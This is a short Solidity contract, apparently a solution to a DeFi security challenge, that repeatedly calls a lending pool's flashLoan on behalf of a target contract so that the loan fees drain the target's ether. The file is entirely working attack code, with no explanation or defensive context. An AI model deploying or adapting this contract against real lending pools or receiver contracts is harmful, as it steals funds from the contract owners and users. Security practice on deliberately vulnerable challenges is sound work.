// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";

interface IPool {
    function flashLoan(address borrower, uint256 borrowAmount) external;
}

contract AttackerProxy {
    using Address for address payable;

    function drainEther(address target, address pool) public {
        for (uint256 i = 0; i < 10; i++) {
            IPool(pool).flashLoan(target, 1);
        }
    }
}